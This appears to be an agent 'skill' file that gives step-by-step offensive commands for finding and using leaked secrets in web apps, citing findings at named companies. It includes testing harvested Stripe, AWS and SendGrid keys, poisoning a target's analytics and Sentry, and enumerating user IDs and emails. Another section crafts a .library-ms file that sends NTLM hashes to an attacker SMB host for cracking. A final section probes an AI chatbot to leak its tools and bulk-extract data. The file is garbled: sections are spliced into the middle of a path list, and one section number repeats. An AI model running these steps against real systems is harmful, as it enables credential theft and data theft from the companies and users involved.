---
name: infodisclosure-hunt
description: Info disclosure, config leak, secret exposure, external data leaks. After DISCOVERY finds candidates — active testing, payload firing, CVE verification. Use when testing INFODISCLOSURE vulnerabilities.
---

# SKILL-INFODISCLOSURE-HUNT — Information Disclosure Hunt — HUNT
# Phase Coverage: 39 (extracted from SKILL-RECON), cross-cutting all phases
# Vuln Classes: info-disclosure, config-leak, secret-exposure, infrastructure-leak
# Purpose: Systematic extraction, testing, and exploitation of exposed sensitive information

---

## P1: localStorage / IndexedDB / SessionStorage Secret Scanning

```
SOURCE: Coinhako C1 — ECDSA Private Key + API Key in localStorage plaintext
CIA: C:H — Any XSS on same origin → full account takeover
```

### Hunt

**Step 1: Extract all storage**
```
mcp__firefox-devtools__navigate_page(url="TARGET_URL")
mcp__firefox-devtools__evaluate_script → dump localStorage and sessionStorage
```

**Step 2: Flag secrets with regex**
```bash
# From browser dump output, grep for secrets
echo "$STORAGE_DUMP" | grep -iE 'privateKey|apiKey|secret|token|password|credential|jwt|bearer|access_key|AWSAccessKeyId'
```

**Step 3: Verify if the secret is real**
```bash
# Test API key
curl -sk "$TARGET/api/endpoint" -H "X-Api-Key: $FOUND_KEY" -w " HTTP:%{http_code}"
```

---

## P2: HTML Source Configuration Exposure

```
SOURCE: Agoda F1 — agoda.pageConfig exposes K8s pod names, sessionId, loginLvl
        Coinhako M6 — Talos trading platform exposes __ENV_CONFIG__
CIA: C:L-M — Internal infrastructure, session identifiers, feature flags
```

### Hunt

**Step 1: Get full page source**
```bash
curl -sk "$TARGET" -o /tmp/source.html
```

**Step 2: Extract all config objects**
```bash
grep -oP '(agoda\.\w+|window\.\w+Config|__\w+__)\s*=\s*(\{[^}]+}|"[^"]{20,}")' /tmp/source.html | head -20
```

**Step 3: Flag sensitive fields**
```bash
grep -oP '(machineName|podName|hostName|deployment|sessionId|memberId|userId|loginLvl|apiKey|token)"\s*:\s*"[^"]+"' /tmp/source.html
```

**Step 4: Check for base64-encoded configs**
```bash
grep -oP '__ENV_CONFIG__\s*=\s*"\K[^"]+' /tmp/source.html | base64 -d 2>/dev/null | jq . 2>/dev/null
```

---

## P3: API Response Data Over-Exposure

```
SOURCE: Coinhako H2 — user_id, controls.id, legal_entity_id in every API response
CIA: C:H — Sequential IDs + excessive fields enable mass enumeration
```

### Hunt

**Step 1: Get user1 data**
```bash
USER1_DATA=$(curl -sk "$TARGET/api/user/me" -H "Authorization: Bearer $USER1_TOKEN")
echo "$USER1_DATA" | jq '{user_id, internal_id, role, email, phone}'
```

**Step 2: Get user2 data (cross-account)**
```bash
USER2_DATA=$(curl -sk "$TARGET/api/user/me" -H "Authorization: Bearer $USER2_TOKEN")
```

**Step 3: Check for sequential IDs**
```bash
USER1_ID=$(echo "$USER1_DATA" | jq -r '.user_id // .id')
USER2_ID=$(echo "$USER2_DATA" | jq -r '.user_id // .id')
echo "User1: $USER1_ID | User2: $USER2_ID | Diff: $((USER2_ID - USER1_ID))"
```

**Step 4: Check for excessive fields**
```bash
# Compare field counts
echo "$USER1_DATA" | jq 'keys | length'
# Flag fields like: password_hash, ssn, dob, internal_notes, api_key, legal_entity_id
```

---

## P4: Kubernetes Pod Name / Infrastructure Pattern Detection

```
SOURCE: Agoda F1 — hk-pc-2g-universal-login-main-749d9d867d-sbk8g in HTML source
CIA: C:L — Internal deployment architecture, datacenter locations, service names
```

### Hunt

**Step 1: Collect machineName from all subdomains**
```bash
for host in $(cat ~/agents/finetune/fullrecon/${SLUG}/subs_resolved.txt); do
  MACHINE=$(curl -sk --max-time 5 "https://$host" | grep -oP 'machineName[^"]*"[^"]*"')
  [[ -n "$MACHINE" ]] && echo "$host → $MACHINE"
done
```

**Step 2: Parse K8s naming convention**
```bash
# Format: {datacenter}-{platform}-{instance}-{service}-{deploy-hash}-{replica-id}
# hk-pc-2g-universal-login-main-749d9d867d-sbk8g
# sg-pc-6i-property-onboarding-main-5759c4cc66-rwfr5
echo "$MACHINES" | while read line; do
  DC=$(echo "$line" | cut -d'-' -f1)  # hk, sg
  SVC=$(echo "$line" | grep -oP '\w+-\w+-\w+-\d+-\w+') # service-deployhash-replica
  echo "Datacenter: $DC | Service: $SVC"
done
```

**Step 3: Cross-reference with known services**
```bash
# Check x-envoy-* headers for service mesh info
curl -sk -I "$TARGET" | grep -i 'x-envoy\|x-k8s\|server'
```

---

## P5: SDK / Third-Party Configuration Secrets

```
SOURCE: Coinhako C2 — Zoho SDK secrets publicly exposed via JSONP config endpoint
CIA: C:H — 3rd-party service secrets enable lateral movement
```

### Hunt

**Step 1: Extract all 3rd-party service identifiers**
```bash
grep -rhoP '(datadog|sentry|mixpanel|zoho|segment|intercom|hotjar|fullstory|amplitude|heap)[^"'\'']{0,50}' \
  ~/agents/finetune/fullrecon/${SLUG}/js/*.js | sort -u
```

**Step 2: Check if config is accessible without auth**
```bash
# Many SDKs expose config via predictable paths
for path in "/js/config.js" "/api/public/config" "/sdk/config.json" "/__/firebase/init.json"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/sdk_config.json "$TARGET$path")
  [[ "$S" == "200" ]] && echo "[SDK CONFIG EXPOSED] $TARGET$path" && cat /tmp/sdk_config.json | jq . 2>/dev/null
done
```

**Step 3: Test if secrets are usable**
```bash
# Datadog RUM token → inject into Datadog dashboard
# Sentry DSN → inject errors into target's Sentry project
# Mixpanel token → send fake events to target's analytics
# Firebase config → access Firebase backend if rules are open
```

---

## P6: Cloud Storage Credential Exposure

```
SOURCE: Coinhako M5 — Pre-signed S3 URL in localStorage with AWS STS credentials
CIA: C:H — Cloud storage access can lead to data breach or infrastructure compromise
```

### Hunt

**Step 1: Extract full pre-signed URLs**
```bash
# From browser console (MCP evaluate_script)
() => {
  const urls = [];
  for (let i = 0; i < localStorage.length; i++) {
    const val = localStorage.getItem(localStorage.key(i));
    const matches = val.match(/https?:\/\/[^"'\s]*s3[^"'\s]*/gi);
    if (matches) urls.push(...matches);
  }
  return urls;
}
```

**Step 2: Test bucket access**
```bash
# Test if S3 bucket is publicly listable
BUCKET=$(echo "$S3_URL" | grep -oP '//[^.]+\.s3\.' | sed 's|//||;s|\.s3\.||')
curl -sk "https://$BUCKET.s3.amazonaws.com/" | head -20

# Test pre-signed URL permissions
curl -sk "$PRESIGNED_URL" -o /tmp/s3_object.txt
file /tmp/s3_object.txt
```

**Step 3: Check for STS token validity**
```bash
# If AccessKeyId + SecretAccessKey + SessionToken found
aws sts get-caller-identity --access-key AKIA... --secret-key ... --session-token ...
```

---

## P7: Internal Type / Stack Trace Leak Detection

```
SOURCE: Agoda — System.Linq.Enumerable+ListSelectIterator`2 in API response
CIA: C:L — Internal type names, framework version, code structure
```

### Hunt

**Step 1: Trigger errors on various endpoints**
```bash
for ep in "/api/404" "/api/error" "/debug" "/trace" "/.env"; do
  RESP=$(curl -sk "$TARGET$ep")
  echo "=== $ep ==="
  echo "$RESP" | head -5
done
```

**Step 2: Check Content-Type for technology hints**
```bash
curl -sk -I "$TARGET" | grep -iE 'Server|X-Powered-By|X-Generator|X-Drupal|X-AspNet'
```

---

## P8: Sequential ID Enumeration

```
SOURCE: Coinhako H2 — user_id, controls.id, kyc_document_id all sequential integers
CIA: C:M — Enables mass user enumeration and targeted attacks
```

### Hunt

**Step 1: Sweep sequential IDs**
```bash
for id in $(seq $((USER1_ID - 10)) $((USER1_ID + 10))); do
  S=$(curl -sk -w "%{http_code}" -o /tmp/idor_test.txt \
       "$TARGET/api/user/$id" -H "Authorization: Bearer $USER2_TOKEN")
  [[ "$S" == "200" ]] && echo "[ID ENUM] ID=$id returns data for user2"
done
```

**Step 2: Check all returned object IDs**
```bash
# Every API response might expose sequential IDs
curl -sk "$TARGET/api/user/me" -H "Authorization: Bearer $USER1_TOKEN" | jq '..|objects|.id? // .Id? // .ID?' | grep -v null | sort -u
```

---

## P9: Email Enumeration via Response Discrepancy

```
SOURCE: Coins.ph — /biz-api/v1/public/user-auth/address-info leaks registration status
CIA: C:I — Attacker can determine which emails have accounts
```

### Hunt

**Step 1: Test response discrepancy**
```bash
# Compare valid vs invalid email responses
KNOWN_VALID="admin@target.com"
KNOWN_INVALID="fake_999@nothing.io"

VALID_RESP=$(curl -sk "$TARGET/api/public/user-auth/address-info?address=$KNOWN_VALID" \
  -H "client-type: WEB")
VALID_FIELD=$(echo "$VALID_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'].get('useSimplePwd','N/A'))" 2>/dev/null)

INVALID_RESP=$(curl -sk "$TARGET/api/public/user-auth/address-info?address=$KNOWN_INVALID" \
  -H "client-type: WEB")
INVALID_FIELD=$(echo "$INVALID_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'].get('useSimplePwd','N/A'))" 2>/dev/null)

if [ "$VALID_FIELD" != "$INVALID_FIELD" ]; then
  echo "[EMAIL ENUM — CIA:C:I] valid=$VALID_FIELD invalid=$INVALID_FIELD"
fi
```

**Step 2: Bulk enumeration**
```bash
# Test common email patterns
for email in "admin@$DOMAIN" "test@$DOMAIN" "user@$DOMAIN" "info@$DOMAIN" \
             "support@$DOMAIN" "hello@$DOMAIN" "contact@$DOMAIN"; do
  RESP=$(curl -sk "$TARGET/api/public/user-auth/address-info?address=$email" \
    -H "client-type: WEB")
  STATUS=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'].get('useSimplePwd','N/A'))" 2>/dev/null)
  echo "  $email: useSimplePwd=$STATUS"
done
```

**Step 3: Timing-based enumeration**
```bash
# When response body is identical, timing may differ
for email in "admin@target.com" "fake_999@nothing.io"; do
  T=$(curl -sk -o /dev/null -w "%{time_total}" \
    "$TARGET/api/public/user-auth/address-info?address=$email" \
    -H "client-type: WEB")
  echo "$email: ${T}s"
done
```

**Step 4: Rate limit test**
```bash
# Test if endpoint has rate limiting
for i in $(seq 1 50); do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    "$TARGET/api/public/user-auth/address-info?address=test$i@example.com" \
    -H "client-type: WEB")
  echo -n "$CODE "
done
echo ""
# If all return 200 (not 429): no rate limiting = mass enumeration possible
```

---

## P10: Debug / Default Endpoint Sweep

```
CIA: C:H — Open debug endpoints can leak full system state
```

```bash
DEBUG_PATHS=(
  "/.env" "/.env.local" "/.env.production" "/.env.backup"
  "/.git/config" "/.git/HEAD" "/.svn/entries"
  "/phpinfo.php" "/info.php" "/test.php"
  "/actuator" "/actuator/env" "/actuator/heapdump" "/actuator/logfile"
  "/debug" "/debug/pprof" "/debug/vars"
  "/console" "/admin" "/phpmyadmin" "/adminer.php"
  "/api-docs" "/swagger.json" "/swagger-ui.html" "/openapi.json"
  "/graphql" "/graphiql" "/playground"
```

---

## P11: Source Map Hunt (SPA/JS Bundles)

```
SOURCE: poorman3exp 2026 — .js.map files reconstruct unminified codebase
CIA: C:H — Full source → hardcoded secrets, internal endpoints
```

### Hunt

**Step 1: Download source maps**
```bash
# Extract sourceMappingURL from page source
MAP_URL=$(curl -sk "$TARGET" | grep -oP 'sourceMappingURL=\K[^"'\''\s]+')
curl -sk "$TARGET/$MAP_URL" -o /tmp/app.js.map

# Fuzz common paths
ffuf -u "$TARGET/static/FUZZ.js.map" -w ~/wordlists/js-files.txt -mc 200 -o /tmp/maps.json -s
```

**Step 2: Decode and search**
```bash
# Use source-map-utils or browser DevTools to reconstruct source
# Search reconstructed code for secrets
grep -rhoP '(api[_-]?key|secret|password|token|private[_-]?key|AWSAccessKeyId)["\s:=]+["\'][a-zA-Z0-9_-]{16,}["\']' /tmp/reconstructed_src/ | sort -u
```

**Step 3: Validate found keys**
```bash
# Test Stripe key
curl https://api.stripe.com/v1/charges -u sk-live-...: -w " HTTP:%{http_code}"

# Test AWS key
aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...
```

---

## P12: GitHub/GitLab Dorking Hunt

```
SOURCE: poorman3exp 2026 — API keys, tokens in public repos
CIA: C:H — Active keys → direct financial/cloud access
```

### Hunt

**Step 1: Run dorks**
```bash
# TruffleHog
trufflehog github --org=target-org --json --verified > /tmp/th_verified.json 2>/dev/null
cat /tmp/th_verified.json | jq '.Results[] | {repo: .RepoName, path: .Path, secret: .DetectorName, url: .SourceMetadata.Data.Git.commit.url}'

# GitLeaks
gitleaks detect --source=. -r /tmp/gitleaks.json -f json 2>/dev/null
```

**Step 2: Verify active keys**
```bash
# For each found key, test against the service
# Stripe: curl https://api.stripe.com/v1/balance -u sk-live-...:
# AWS: aws sts get-caller-identity
# SendGrid: curl -H "Authorization: Bearer SG..." https://api.sendgrid.com/v3/user/profile
```

---

## P13: API Documentation & Swagger Hunt

```
SOURCE: poorman3exp 2026 — /swagger.json reveals entire API surface
CIA: M-H — Hidden admin endpoints → broken access control
```

### Hunt

**Step 1: Download API spec**
```bash
for path in "/swagger.json" "/openapi.json" "/api-docs" "/v2/api-docs" "/v3/api-docs"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/api_spec.json "$TARGET$path")
  [[ "$S" == "200" ]] && echo "[API SPEC] $path" && cat /tmp/api_spec.json | jq '.paths | keys[]' | head -20
done
```

**Step 2: Find admin/hidden endpoints**
```bash
cat /tmp/api_spec.json | jq '.paths | to_entries[] | select(.key | test("admin|internal|debug|system|manage")) | .key'
```

**Step 3: Test endpoints with normal user token**
```bash
for ep in $(cat /tmp/api_spec.json | jq -r '.paths | keys[]'); do
  S=$(curl -sk -w "%{http_code}" -o /tmp/admin_test.txt "$TARGET$ep" \
    -H "Authorization: Bearer $USER1_TOKEN")
  [[ "$S" == "200" ]] && echo "[ADMIN ACCESS] $ep → HTTP $S"
done
```

---

## P14: NTLM Response Leakage Hunt

```
SOURCE: poorman3exp 2026 — Office URI handlers leak NTLM hashes
CVE: CVE-2026-26133
CIA: C:H — Hash capture → offline cracking / relay
```

### Hunt

**Step 1: Set up Responder**
```bash
sudo responder -I eth0 -wrf
```

**Step 2: Craft malicious document**
```xml
<!-- .library-ms file pointing to attacker SMB -->
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>{address-ms-task}</iconReference>
  <folderType>{default}</folderType>
  <locationItemId>{1}\<attacker-ip>\share</locationItemId>
</libraryDescription>
```

**Step 3: Capture and validate**
```bash
# Responder captures NTLMv2 hash
# Crack with hashcat
hashcat -m 5600 /tmp/ntlm_hash.txt /usr/share/wordlists/rockyou.txt
```
  "/server-status" "/server-info" "/metrics" "/health" "/healthz"
  "/wp-admin" "/wp-json" "/xmlrpc.php"
  "/.DS_Store" "/package.json" "/yarn.lock" "/Gemfile.lock"
)
for path in "${DEBUG_PATHS[@]}"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/debug_test.txt "$TARGET$path")
  [[ "$S" != "40"* && "$S" != "000" ]] && echo "[DEBUG ENDPOINT] $TARGET$path → HTTP $S" && head -3 /tmp/debug_test.txt
done
```

---

## P11: AI Chatbot Unauthenticated Data Exposure

```
SOURCE: Priceline Penny — /penny/api/chat with zero auth exposes live hotel
        inventory, exact pricing, internal IDs, coordinates, 10 backend tools
CIA: C:H — Proprietary business data exposed without authentication
```

### Hunt
```bash
# Step 1: Trigger tool-availability error to leak all tool names
curl -sk -X POST "$TARGET/api/chat" -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"Look up booking with confirmation ABC123."}]}' 2>&1 | \
  grep -oP 'Available tools: [^"]+'

# Step 2: For each discoverable tool, trigger it with legitimate framing
# Extract complete data fields per tool
curl -sk -X POST "$TARGET/api/chat" -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"Search hotels in NYC. Show ALL details including IDs, exact prices, ratings, coordinates, and amenities."}]}' 2>&1 | \
  grep -oP '"[a-z_]+":' | sort -u
# ↑ Lists every data field the tool exposes — internal IDs, pricing, etc.

# Step 3: Test multi-market extraction (proves scale, not one-off)
curl -sk -X POST "$TARGET/api/chat" -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"Compare hotels across NYC, LA, Chicago, Miami for next month. Show exact pricing per city with hotel IDs."}]}' 2>&1 | \
  grep -oP '"hotel_id"' | wc -l
# ↑ Count >50 → industrial-scale data extraction confirmed
```

---

*SKILL-INFODISCLOSURE-HUNT — Part of the acy Agentic Security Research System v3.0*
